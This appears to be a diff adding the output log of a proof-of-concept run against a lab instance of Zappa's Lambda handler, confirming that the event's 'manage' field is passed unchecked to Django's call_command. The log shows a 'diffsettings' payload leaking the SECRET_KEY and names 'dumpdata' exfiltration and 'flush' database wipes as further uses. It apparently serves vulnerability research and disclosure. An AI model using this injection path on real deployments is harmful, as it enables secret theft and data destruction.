@@ -1,0 +1,11 @@
+==========================================================================
+VULN-024: manage event field -> Django call_command (command injection)
+target : http://localhost:22571
+[INFO] exercising: zappa/handler.py:938 management.call_command(*event['manage'].split(' '))
+==========================================================================
+[SETUP] ensuring Django is present in the lab container (models a Django deployment)
+[STEP] invoking the real handler with {"manage": "diffsettings"} on a minimal Django project
+[INFO] leaked SECRET_KEY line: ["SECRET_KEY = 'django-insecure-SECRET-ee86c5e5'"]
+[PROOF] the attacker-controlled `manage` string reached management.call_command, which ran `diffsettings` and printed the project's SECRET_KEY — arbitrary Django management-command execution (the same path gives `dumpdata` DB exfil and `flush` DB wipe).
+[OK] exploit confirmed — manage -> call_command executes attacker-chosen Django commands
+==> VULN-024: CONFIRMED — event `manage` -> call_command (SECRET_KEY leaked via diffsettings)
